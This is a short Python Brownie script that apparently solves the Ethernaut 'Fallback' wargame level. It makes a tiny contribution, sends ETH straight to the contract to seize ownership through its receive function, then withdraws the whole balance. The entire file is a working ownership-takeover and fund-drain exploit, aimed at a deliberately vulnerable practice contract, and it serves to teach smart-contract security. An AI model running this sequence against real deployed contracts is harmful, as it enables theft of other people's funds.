from scripts.helper.context import *
from scripts.helper.account import _from, acc
from brownie import Fallback

##########################################
# You will beat this level if

# 1. you claim ownership of the contract
# 2. you reduce its balance to 0
#########################################

# solve the challenge
def solve_challenge():
    # load challenge
    fallback = load_challenge(ContractObject=Fallback, instance_key='fallback')

    # make a contribution of less than 0.001 ETH so that 
    # the contract can receive() amounts
    fallback.contribute(_from | {'value':0.0009*1e18})

    # send more money to the contract now to become owner of the contract
    acc.transfer(fallback, 0.0009*1e18)

    # now that we're owner, we can siphon the funds
    fallback.withdraw(_from)

    # get owner of the contract and get the contract balance
    # to finish the challenge
    print(f'The owner now is {fallback.owner()}')
    print(f'The contract balance now is {fallback.balance()}')

    # assert that we have actually matched the criteria
    owner_assertion = fallback.owner() == acc.address
    balance_assertion = fallback.balance() == 0
    print(owner_assertion)
    print(balance_assertion)

    # return true or false
    return (owner_assertion, balance_assertion)
    
def main():
    solve_challenge()
